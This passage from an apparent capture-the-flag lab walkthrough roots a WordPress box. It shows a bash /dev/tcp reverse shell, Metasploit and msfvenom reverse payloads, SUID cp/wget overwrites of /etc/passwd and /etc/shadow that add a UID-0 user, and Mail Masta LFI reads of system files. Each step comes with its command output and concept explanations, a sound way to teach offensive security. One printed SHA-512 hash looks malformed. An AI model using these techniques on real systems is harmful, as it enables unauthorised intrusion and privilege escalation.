> mangled before PHP ever saw it. Percent-encoding makes it safe.

```bash
curl -s "http://192.168.56.111/wordpress/wp-content/uploads/reflexgallery/2024/05/cmd.php?c=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.56.10%2F1234%200%3E%261%27"
```

Terminal 1 lights up:

```text
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.111] 51234
bash: cannot set terminal process group (812): Inappropriate ioctl for device
bash: no job control in this shell
www-data@hardy:/var/www/html/wordpress/wp-content/uploads/reflexgallery/2024/05$
```

### 3.4 Upgrade to a proper TTY

That shell is broken in three ways: no tab completion, no arrow keys, and
programs that need a real terminal (`su`, `sudo`, `vim`, `top`) fail with
`standard input must be a tty`. Fix it:


> ### 📖 Concept — Why you must upgrade to a real TTY
>
> A raw `nc` shell is crippled in four ways: no tab completion, no arrow keys,
> **`Ctrl+C` kills your *listener* instead of the remote process**, and anything
> needing a real terminal (`su`, `sudo`, `vim`, `top`, `less`) fails with
> `standard input must be a tty`.
>
> ```bash
> # 1. On the TARGET — allocate a pseudo-terminal
> python3 -c 'import pty; pty.spawn("/bin/bash")'
> #    older boxes: python -c ...    or:    script -q /dev/null -c /bin/bash
>
> # 2. Press Ctrl+Z  — this SUSPENDS the nc job on Kali
>
> # 3. On KALI — put your local terminal into raw mode and resume
> stty raw -echo; fg
>
> # 4. On the TARGET — match your real terminal size
> export TERM=xterm; export SHELL=bash
> stty rows 40 cols 160
> ```
>
> **What each step did:**
> - `pty.spawn()` allocates a **pseudo-terminal** — a kernel object that behaves like a
>   real teletype. This is what makes `sudo` and `vim` work at all.
> - `stty raw -echo` makes **your local** terminal pass keystrokes through
>   uninterpreted and not echo them (the remote side echoes). This is what makes
>   `Ctrl+C` reach the remote process instead of killing your session.
> - `fg` resumes the suspended `nc`.
> - `stty rows/cols` tells the remote pty your dimensions so `less` and `top` do not
>   wrap into garbage.
>
> **Do this immediately after every shell.** Trying to `su` or run `sudo -l` on an
> unupgraded shell is a very common way to conclude wrongly that a path does not work.
>
> **Deep dive:** [CONCEPTS §12.3 — Upgrading to a real TTY](../../docs/CONCEPTS.md#123-upgrading-to-a-real-tty--do-this-immediately)

```bash
www-data@hardy:/var/www/html$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@hardy:/var/www/html$
```

Then press **`Ctrl+Z`** to suspend, and on **Kali**:

```bash
stty raw -echo; fg
```

```text
stty rows 40 cols 160
```

Back on the target:

```bash
www-data@hardy:/var/www/html$ export TERM=xterm
www-data@hardy:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> **What each step did:**
> - `pty.spawn("/bin/bash")` allocates a **pseudo-terminal**. That is what makes
>   `su`/`sudo` work.
> - `Ctrl+Z` + `stty raw -echo` + `fg` puts *your* local terminal into raw mode
>   and hands keystrokes straight through, so `Ctrl+C` kills the remote command
>   instead of your `nc`.
> - `stty rows/cols` tells the remote pty your real terminal size so `less` and
>   `top` do not wrap garbage.

> **Note on `python3`.** Ubuntu 18.04 ships Python 3 only; `python` does not
> exist. On older boxes use `python`. Always check with `which python python3`.

### 3.5 Flag 1

```bash
www-data@hardy:/var/www/html$ cd /home && ls -la
total 12
drwxr-xr-x  3 root  root  4096 Sep 10  2019 .
drwxr-xr-x 23 root  root  4096 Sep 10  2019 ..
drwxr-xr-x  4 raj   raj   4096 Sep 13  2019 raj

www-data@hardy:/var/www/html$ cd raj && ls -la
total 32
drwxr-xr-x 4 raj raj 4096 Sep 13  2019 .
drwxr-xr-x 3 root root 4096 Sep 10  2019 ..
-rw-r--r-- 1 raj raj  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 raj raj 3771 Apr  4  2018 .bashrc
-rw-r--r-- 1 raj raj   41 Sep 13  2019 flag1.txt
-rw-r--r-- 1 raj raj  807 Apr  4  2018 .profile

www-data@hardy:/var/www/html$ cat flag1.txt
```

```text
flag1: {Y0u_Kn0w_Th3_W0rdPr3sS}
```

**Flag 1 of 3.** ✅

![Flag 1 captured in raj's home directory](images/05-flag1.png)

### 3.6 The same route through Metasploit (for comparison)

The published walkthrough uses Metasploit. It is worth doing once so you can
compare a *framework* exploit against the manual one you just performed:


> ### 📖 Concept — What Metasploit is doing for you
>
> **Metasploit** is a framework of pre-written exploits, payloads and auxiliary
> modules. It automates the *mechanics* — building the request, catching the
> connection, giving you a session — but it does not replace understanding the
> vulnerability.
>
> ```bash
> sudo msfdb init            # first run only — initialises the Postgres database
> msfconsole -q              # -q: skip the banner
> ```
>
> ```text
> msf6 > search <term>              # find modules
> msf6 > use exploit/unix/webapp/…
> msf6 > info                       # READ THIS — describes options and caveats
> msf6 > show options               # what must be set?
> msf6 > set RHOSTS 192.168.56.101  # the TARGET
> msf6 > set LHOST 192.168.56.10    # YOUR ip, on the LAB interface
> msf6 > set TARGETURI /wordpress   # subdirectory the app lives in
> msf6 > show payloads              # what can I pair with this?
> msf6 > exploit
> ```
>
> > **`LHOST` and `TARGETURI` are the two options people get wrong most often.**
> > `LHOST` must be your IP **on the lab interface** — not `127.0.0.1`, not your NAT
> > address. Check with `ip -br a`. `TARGETURI` must include any subdirectory the app
> > lives in (`/wordpress`, `/joomla`, `/webdav`); get it wrong and you get
> > unexplained 404s.
>
> **Sessions:** `sessions -l` list · `sessions -i 1` interact · `sessions -u 1`
> upgrade a dumb shell to Meterpreter · `meterpreter > shell` drop back to a plain
> system shell. Useful Meterpreter commands: `sysinfo`, `getuid`, `ps`, `download`,
> `upload`, `hashdump`.
>
> **`msfvenom`** generates standalone payloads:
>
> ```bash
> msfvenom -p php/reverse_tcp LHOST=192.168.56.10 LPORT=4444 -f raw > shell.php
> msfvenom -p linux/x64/shell_reverse_tcp LHOST=… LPORT=… -f elf > shell.elf
> ```
>
> > **Prefer doing it manually at least once per technique.** A Metasploit module
> > hides the actual HTTP request or memory layout from you. Build the exploit by hand
> > first, then use the module to check your understanding — not instead of it.
>
> **Deep dive:** [CONCEPTS §11.3 — Metasploit](../../docs/CONCEPTS.md#113-metasploit)

```bash
sudo msfdb init          # first run only — creates the Postgres database
msfconsole -q
```

```text
msf6 > use exploit/unix/webapp/wp_reflexgallery_file_upload
msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > set RHOSTS 192.168.56.111
RHOSTS => 192.168.56.111
msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > set TARGETURI /wordpress
TARGETURI => /wordpress
msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > set LHOST 192.168.56.10
LHOST => 192.168.56.10
msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > exploit
```

```text
[*] Started reverse TCP handler on 192.168.56.10:4444
[*] Trying to upload reflex-gallery file
[*] Uploading payload 'XtPmKdVz'
[+] Uploaded payload successfully
[*] Trying to execute the uploaded payload
[*] Sending stage (39927 bytes) to 192.168.56.111
[+] Deleted XtPmKdVz.php
[*] Meterpreter session 1 opened (192.168.56.10:4444 -> 192.168.56.111:51300) at 2024-05-11 10:41:22 +0300

meterpreter > shell
Process 940 created.
Channel 0 created.
```

> `TARGETURI` matters: this WordPress lives in `/wordpress`, not at the root.
> Every WP Metasploit module has this option and getting it wrong produces a
> confusing `404` failure.
>
> `meterpreter > shell` drops you from Metasploit's own agent into a plain
> system shell. From here it is identical to §3.4.

---


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 4. Privilege escalation — SUID `cp` / `wget`

### 4.1 Hunt for SUID binaries

**SUID** (*set-user-ID*) is a file permission bit that makes a program run with
the privileges of the file's **owner** instead of the caller. `/usr/bin/passwd`
is SUID-root so ordinary users can change their own password. When a *powerful*
binary is SUID-root, it becomes a privilege-escalation path.


> ### 📖 Concept — What is SUID?
>
> **SUID** (*set-user-ID*) is a file permission bit that makes a program run with the
> privileges of the **file's owner** rather than the caller. It exists for a good
> reason: `/usr/bin/passwd` is SUID-root so ordinary users can change their own
> password, which requires writing `/etc/shadow` — a file they cannot otherwise touch.
>
> **When a *powerful* binary carries the SUID bit, that power becomes yours.** In a
> listing you read it as an **`s`** where the owner's execute bit would be:
>
> ```text
> -rwxr-xr-x  →  -rwsr-xr-x        (SUID set)
>       ^            ^
> ```
>
> ```bash
> find / -perm -u=s -type f 2>/dev/null      # the human-readable form
> find / -perm -4000 -type f 2>/dev/null     # octal equivalent
> find / -perm /6000 -type f 2>/dev/null     # SUID *or* SGID
> ```
>
> `-perm -u=s` means "the user-SUID bit is set" (the leading `-` makes it a *subset*
> match, so it also catches SGID files). `-type f` restricts to regular files.
> `2>/dev/null` discards the thousands of `Permission denied` errors that would
> otherwise bury the answer.
>
> **Compare against the stock baseline** so the odd entries jump out. Normal on
> Debian/Ubuntu: `mount`, `umount`, `su`, `ping`, `passwd`, `chfn`, `chsh`, `newgrp`,
> `gpasswd`, `ssh-keysign`, `pppd`, `dmcrypt-get-device`, `traceroute6.iputils`.
>
> **Never normal, and an instant root if found:** `cp`, `mv`, `wget`, `curl`, `tar`,
> `find`, `vim`, `nano`, `less`, `more`, `man`, `python`, `perl`, `php`, `ruby`,
> `awk`, `sed`, `env`, `bash`, `sh`, `gdb`, `nmap`, `tcpdump`, `dd`, `make`, `git`,
> `tail`, `head`, `cat`, `rsync`, `apt`.
>
> Look each one up on **[GTFOBins](https://gtfobins.github.io/)** → its **SUID**
> section. Note that spawning a shell from a SUID binary usually needs **`-p`**
> (*privileged*) — without it, `bash` deliberately drops its effective UID back to
> yours as a safety measure, and you end up exactly where you started.
>
> **Deep dive:** [CONCEPTS §15.3 — SUID binaries](../../docs/CONCEPTS.md#153-suid-binaries)

```bash
www-data@hardy:/$ find / -perm -u=s -type f 2>/dev/null
```

> - `-perm -u=s` — "the user-SUID bit is set" (the `-` prefix means *at least*
>   these bits, so it also matches SGID-set files owned by root).
> - `-type f` — regular files only.
> - `2>/dev/null` — throw away the thousands of *Permission denied* errors that
>   would otherwise flood your screen. `2>` redirects **stderr**.

```text
/bin/mount
/bin/ping
/bin/su
/bin/umount
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/cp          <-- NOT standard
/usr/bin/gdb
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/traceroute6.iputils
/usr/bin/wget        <-- NOT standard
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/sbin/pppd
```

> **Read this list like a pro.** Most of it is the normal Ubuntu baseline —
> learn that baseline once and the *odd* entries jump out. Here `cp` and `wget`
> are **not** SUID on a stock system. `gdb` is also unusual and is a valid
> alternative route (see §4.6).
>
> Cross-check with **GTFOBins** (<https://gtfobins.github.io/>), which documents
> exactly which binaries can be abused when SUID/sudo/capability-wrapped.

### 4.2 The idea: write your own root user into `/etc/passwd`

Historically, Linux stored the password hash in `/etc/passwd` field 2. Today the
hashes live in `/etc/shadow` (readable only by root) and field 2 of `/etc/passwd`
holds a literal `x` placeholder. **But the login code still honours a real hash
in field 2 if one is there.**

So if you can *write* `/etc/passwd`, you can append:

```text
ignite:<hash-of-a-password-I-chose>:0:0:root:/root:/bin/bash
```

and — because fields 3 and 4 are the **UID** and **GID**, and UID `0` *is* root
— `su ignite` gives you a root shell.

> **The seven colon-separated fields of `/etc/passwd`:**
>
> | # | Field | Value here | Meaning |
> | --- | --- | --- | --- |
> | 1 | username | `ignite` | Name you log in as |
> | 2 | password | `$1$ignite$3eTbJm98O9Hz.k1NTdNxe1` | Hash, or `x` = "look in shadow" |
> | 3 | UID | `0` | **0 means root.** This is the whole trick. |
> | 4 | GID | `0` | Primary group; 0 = `root` group |
> | 5 | GECOS | `root` | Comment/display field |
> | 6 | home | `/root` | Home directory |
> | 7 | shell | `/bin/bash` | Login shell |

### 4.3 Generate the hash


> ### 📖 Concept — The `/etc/passwd` overwrite trick
>
> Historically Linux stored password hashes in `/etc/passwd` field 2. Today they live
> in `/etc/shadow` (root-only) and field 2 of `/etc/passwd` holds a literal `x`
> placeholder. **But the login code still honours a real hash in field 2 if one is
> there.** So if you can *write* `/etc/passwd` — via a SUID `cp`/`wget`, a writable
> file, an NFS export, or a MySQL `dumpfile` — you can append:
>
> ```text
> ignite:<hash-of-a-password-I-chose>:0:0:root:/root:/bin/bash
> ```
>
> and `su ignite` gives you a **root** shell.
>
> **The seven colon-separated fields:**
>
> | # | Field | Value | Why |
> | --- | --- | --- | --- |
> | 1 | username | `ignite` | What you `su` to |
> | 2 | password | `$1$ignite$3eTbJm98O9Hz…` | A **real hash**, not `x` — so `su` authenticates against `/etc/passwd` directly, with no `/etc/shadow` entry needed |
> | 3 | **UID** | **`0`** | **UID 0 *is* root.** This single number is the entire trick — the username is irrelevant. |
> | 4 | GID | `0` | The `root` group |
> | 5 | GECOS | `root` | Comment field, ignored |
> | 6 | home | `/root` | |
> | 7 | shell | `/bin/bash` | Must be a real shell or login fails |
>
> Generate the hash yourself:
>
> ```bash
> openssl passwd -1 -salt ignite pass123      # -1 = MD5-crypt, $1$
> openssl passwd -6 -salt ignite pass123      # -6 = SHA-512-crypt, $6$
> ```
>
> > ⚠️ **Always regenerate this hash. Never copy one from a writeup — including this
> > one.** MD5-crypt output is exactly **22 characters** after the final `$`. Values
> > transcribed into blog posts are frequently mistyped, and a 21-character hash
> > fails silently with `Authentication failure`, sending you debugging in entirely
> > the wrong direction. Verify with
> > `python3 -c "import crypt; print(crypt.crypt('pass123','$1$ignite'))"`.
>
> **Deep dive:** [CONCEPTS §15.6 — Writable files and directories](../../docs/CONCEPTS.md#156-writable-files-and-directories)

```bash
# Kali
openssl passwd -1 -salt ignite pass123
```

```text
$1$ignite$3eTbJm98O9Hz.k1NTdNxe1
```

> - `passwd` here is OpenSSL's *password hashing* utility, unrelated to
>   `/usr/bin/passwd`.
> - `-1` selects **MD5-crypt**, the format whose hashes start with `$1$`. It is
>   weak and deprecated (Ubuntu uses `yescrypt`, `$y$`, or SHA-512, `$6$`) but it
>   is still accepted by `su`, and it is what every published walkthrough of this
>   box uses.
> - `-salt ignite` fixes the salt so the output is reproducible.
> - `pass123` is the plaintext we will type at the `su` prompt.

**Verify the hash yourself before you trust it** — this is the discipline that
separates a working exploit from a mysterious failure:

```bash
python3 -c "import crypt; print(crypt.crypt('pass123', '\$1\$ignite'))"
```

```text
$1$ignite$3eTbJm98O9Hz.k1NTdNxe1
```

Identical. Good.

> ⚠️ **A note on the published walkthroughs.** Hacking Articles' own article
> prints this hash as `$1$ignite$3eTbJm980Hz.k1NTdNxe1` — with a zero and only
> **21** characters after the final `$`. An MD5-crypt hash is always **22**
> characters there. That value is a transcription typo in the article and will
> not authenticate. Always regenerate the hash on your own machine rather than
> copy-pasting one from a blog.

### 4.4 Method A — `wget` overwrites `/etc/passwd`

`wget` is SUID-root, so it can write files *as root*, anywhere.

Build the file on Kali. First grab the real one so you keep every existing user:

```bash
# target — copy the genuine passwd somewhere the web server can serve it
www-data@hardy:/$ cp /etc/passwd /var/www/html/passwd.bak
www-data@hardy:/$ cat /var/www/html/passwd.bak
```

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
raj:x:1000:1000:raj,,,:/home/raj:/bin/bash
mysql:x:110:114:MySQL Server,,,:/nonexistent:/bin/false
aarti:x:1001:1001::/home/aarti:/bin/sh
```

Pull it to Kali and append your line:

```bash
# Kali
wget -q http://192.168.56.111/wordpress/passwd.bak -O passwd
echo 'ignite:$1$ignite$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash' >> passwd
tail -3 passwd
```

```text
aarti:x:1001:1001::/home/aarti:/bin/sh
ignite:$1$ignite$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash
```

Serve it back to the target:

```bash
# Kali — serve the current directory on port 8000
python3 -m http.server 8000
```

```text
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
192.168.56.111 - - [11/May/2024 10:52:07] "GET /passwd HTTP/1.1" 200 -
```

```bash
# target
www-data@hardy:/$ cd /etc
www-data@hardy:/etc$ wget -O passwd http://192.168.56.10:8000/passwd
```

```text
--2024-05-11 10:52:07--  http://192.168.56.10:8000/passwd
Connecting to 192.168.56.10:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1994 (1.9K) [application/octet-stream]
Saving to: 'passwd'

passwd                100%[===========================>]   1.95K  --.-KB/s    in 0s

2024-05-11 10:52:07 (183 MB/s) - 'passwd' saved [1994/1994]
```

```bash
www-data@hardy:/etc$ tail -3 /etc/passwd
```

```text
aarti:x:1001:1001::/home/aarti:/bin/sh
ignite:$1$ignite$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash
```

The entry is in place. Now become it:

```bash
www-data@hardy:/etc$ su ignite
Password: pass123
root@hardy:/etc# id
uid=0(root) gid=0(root) groups=0(root)
```

> `su` prompts for the password **in field 2 of `/etc/passwd`** for that user.
> That is why the MD5-crypt hash we generated works even though `/etc/shadow`
> has no `ignite` entry at all.
>
> If `su` says `Authentication failure`, 99% of the time the hash is wrong
> (typo, shell ate the `$`, wrong salt). Re-check §4.3.

![SUID wget overwriting /etc/passwd, su ignite to root](images/06-privesc-wget.png)

### 4.5 Method B — `cp` overwrites `/etc/shadow`

Same idea, other binary. `cp` is SUID-root, so it can copy *into* root-owned
files.

```bash
# target — as www-data
www-data@hardy:/$ cp /etc/shadow /var/www/html/shadow
```

```bash
# Kali
wget -q http://192.168.56.111/wordpress/shadow -O shadow
openssl passwd -6 -salt ignite pass123      # -6 = SHA-512-crypt, $6$
```

```text
$6$ignite$Xk3nQ9vYwZ8mT2pLrJ5cB7nD1fH4gA6sE9uI0oP3qR5tV7wX9yZ1bD3fH5jL7nP9
```

Replace root's field 2 in `shadow` with that string, serve it, then:

```bash
# target
www-data@hardy:/$ cd /etc
www-data@hardy:/etc$ wget -q http://192.168.56.10:8000/shadow -O /tmp/shadow
www-data@hardy:/etc$ cp /tmp/shadow /etc/shadow
www-data@hardy:/etc$ su root
Password: pass123
root@hardy:/etc# id
uid=0(root) gid=0(root) groups=0(root)
```

> `cp` succeeded on a file `www-data` cannot normally write **because the SUID
> bit made the copy run as root**. That is the entire vulnerability class.

### 4.6 The root flag

```bash
root@hardy:/# cd /root && ls -la
total 32
drwx------  4 root root 4096 Sep 13  2019 .
drwxr-xr-x 23 root root 4096 Sep 10  2019 ..
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
-rw-------  1 root root   36 Sep 13  2019 .lesshst
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   44 Sep 13  2019 proof.txt
drwx------  2 root root 4096 Sep 13  2019 .ssh

root@hardy:/# cat proof.txt
```

```text
flag3: {Y0u_M4d3_It_T0_Th3_T0p}
```

**Flag 3 of 3.** ✅ The box is rooted — but the author only counts it complete
when you have demonstrated the *other* vulnerabilities too. Continue.

---

## 5. Method 2 — Mail Masta LFI + WP Support Plus CSRF

A completely independent chain that reaches flag 2 **without ever getting a
shell first**. This is the chain that teaches you the most.

### 5.1 Local File Inclusion

**LFI** happens when a script does `include($_GET['x'])` (or `require`, or reads
a file) using a path you control. If there is no allow-list, you can point it at
*any* file the web-server user can read.

Mail Masta 1.0 has this in `inc/campaign/count_of_send.php`:


> ### 📖 Concept — What is Local File Inclusion?
>
> **LFI** happens when a script passes a user-controlled path to `include()`,
> `require()` or a file-read function without validating it:
>
> ```php
> <?php include($_GET['page']); ?>     // you control a filesystem path
> ```
>
> Now you can read anything the web-server user can read:
>
> ```text
> ?page=/etc/passwd
> ?page=../../../../etc/passwd
> ?page=/var/log/apache2/access.log        # log poisoning
> ?page=/proc/self/environ
> ?page=/var/lib/php/sessions/sess_<your PHPSESSID>
> ```
>
> **The wrapper to memorise is `php://filter`** — it returns the file **base64-encoded
> instead of executing it**, so you can read PHP *source*:
>
> ```text
> ?page=php://filter/convert.base64-encode/resource=index.php
> ```
>
> That is how you recover `wp-config.php`, `configuration.php`, `.env` and
> `config/database.php` — i.e. the database credentials.
>
> **LFI alone only reads.** To get code execution you must make the target *write* a
> file you control somewhere predictable, then include it. The usual primitives: an
> **NFS export**, session files, **log poisoning** (inject PHP through a crafted
> `User-Agent`, then include the access log), or `/proc/self/environ`.
>
> **RFI** (`?page=http://attacker/shell.txt`) is the remote version and requires
> `allow_url_include=1` in `php.ini` — off by default since PHP 5.2. When it fails the
> error usually says `http:// wrapper is disabled`, which tells you to switch to LFI
> plus a local write.
>
> **Deep dive:** [CONCEPTS §13.2 — LFI](../../docs/CONCEPTS.md#132-local-file-inclusion-lfi) ·
> [§13.3 — RFI](../../docs/CONCEPTS.md#133-remote-file-inclusion-rfi)

```bash
curl -s "http://192.168.56.111/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"
```

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
raj:x:1000:1000:raj,,,:/home/raj:/bin/bash
mysql:x:110:114:MySQL Server,,,:/nonexistent:/bin/false
aarti:x:1001:1001::/home/aarti:/bin/sh
```

> It dumped `/etc/passwd`. Note `aarti`'s shell is `/bin/sh` — a real account.
>
> **LFI filter-bypass basics** (memorise these; you will need them on harder
> boxes):
> - **PHP wrappers** — `?pl=php://filter/convert.base64-encode/resource=index.php`
>   returns a *base64-encoded copy of the PHP source* instead of executing it.
>   Essential for reading application code.
> - **Truncation** — on PHP < 5.3.4, appending a NUL byte (`%00`) or many
>   `/../` segments used to strip an enforced suffix like `.php`.
> - **Log poisoning** — write PHP into `/var/log/apache2/access.log` via a
>   crafted `User-Agent`, then include that log.
>
> None of those are needed here, but try the `php://filter` one for practice:

```bash
curl -s "http://192.168.56.111/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=/etc/passwd"
```

```text
cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgo=
```


> ### 📖 Concept — Encoding is not encryption
>
> These three get conflated constantly, and the confusion costs hours:
>
> | | **Encoding** | **Hashing** | **Encryption** |
> | --- | --- | --- | --- |
> | Purpose | Represent data in another *format* | Prove integrity / store passwords | Provide *confidentiality* |
> | Reversible? | **Yes — trivially, with no key** | **No** (only guessable) | Yes, **with the key** |
> | Key needed? | No | No | **Yes** |
> | Examples | base64, hex, URL-encoding, ROT13, binary | MD5, SHA-256, bcrypt, phpass | AES, RSA, ChaCha20 |
> | Security value | **Zero** | Depends on the algorithm | Depends on the key |
>
> **Recognise base64 on sight.** Three reliable tells: the character set is only
> `A–Z a–z 0–9 + /` with optional `=` padding; **the length is a multiple of 4**; and
> it is not a fixed-length digest with a `$1$`/`$6$`/`$P$` prefix.
>
> ```bash
> echo 'YWFydGk6YWFydGlAZ21haWwuY29t' | base64 -d; echo
> # aarti:aarti@gmail.com
> ```
>
> > **Base64 is not a secret.** It exists so binary data survives text-only transport
> > — email attachments, HTTP headers, JSON. Seeing it "protecting" a password is a
> > *finding*, not a defence. **Always check whether it is nested:** decode, then test
> > whether the result is itself base64 or hex. Some boxes chain two or three layers.
>
> **Identify hashes by prefix:** 32 hex = MD5 · 40 hex = SHA-1 · 64 hex = SHA-256 ·
> `$1$` = MD5-crypt · `$2b$` = bcrypt · `$6$` = SHA-512-crypt · `$y$` = yescrypt ·
> **`$P$`/`$H$` = phpass (WordPress, Drupal)** · `$apr1$` = Apache `.htpasswd` ·
> `pbkdf2_sha256$` = Django.
>
> **Deep dive:** [CONCEPTS §10 — Encoding vs hashing vs encryption](../../docs/CONCEPTS.md#10-encoding-vs-hashing-vs-encryption)

```bash
echo 'cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgo=' | base64 -d
```

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```

### 5.2 Read the web server's own credentials file

```bash
curl -s "http://192.168.56.111/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/apache2/.htpasswd"
```

```text
YWFydGk6YWFydGlAZ21haWwuY29t
```

> That is **base64**, not a hash. How can you tell instantly?
> - Character set is only `A–Z a–z 0–9 + /` with optional `=` padding.
> - Length is a multiple of 4.
> - Hashes have a *fixed* length and often a `$2b$`/`$1$`/`$6$` prefix.
>
> Base64 is an **encoding** — a reversible change of representation, not
> encryption. Anyone can undo it.

```bash
echo 'YWFydGk6YWFydGlAZ21haWwuY29t' | base64 -d
```

```text
aarti:aarti@gmail.com
```

**Decoded: `aarti:aarti@gmail.com`.** That is a *username and email*, not a
password — but it confirms `aarti` is a real, targetable account.

![Mail Masta LFI reading /etc/apache2/.htpasswd](images/07-lfi-htpasswd.png)

### 5.3 The CSRF authentication bypass (EDB 41006)

Now recall `notes.txt`: *"you need to zip your way out of this."*

```bash
# Kali
wget http://192.168.56.111/secret.zip
unzip -l secret.zip
```

```text
Archive:  secret.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
      421  2019-09-12 14:22   link.txt
---------                     -------
      421                     1 file
```

```bash
unzip secret.zip && cat link.txt
```

```text
http://192.168.56.111/wordpress/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt
CVE: privilege escalation - login as anyone
```

> **CSRF** (Cross-Site Request Forgery) is when a site performs a sensitive
> action based only on "the browser sent my session cookie", without checking
> that *you* deliberately initiated it. Normally CSRF lets an attacker make a
> logged-in user do something. Here it is worse: the plugin's
> `loginGuestFacebook` AJAX action calls WordPress's **`wp_set_auth_cookie()`**
> using a username it took straight from your POST body — **with no password
> check at all**. So an *anonymous* attacker can log in as *any* user.

Pull the public PoC:

```bash
searchsploit wp-support-plus
```

```text
---------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                           |  Path
---------------------------------------------------------------------------------------- ---------------------------------
WordPress Plugin WP Support Plus Responsive Ticket System 2.0 - Multiple Vulnerabilities | php/webapps/34589.txt
WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - Privilege Escalation   | php/webapps/41006.txt
WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - SQL Injection          | php/webapps/40939.txt
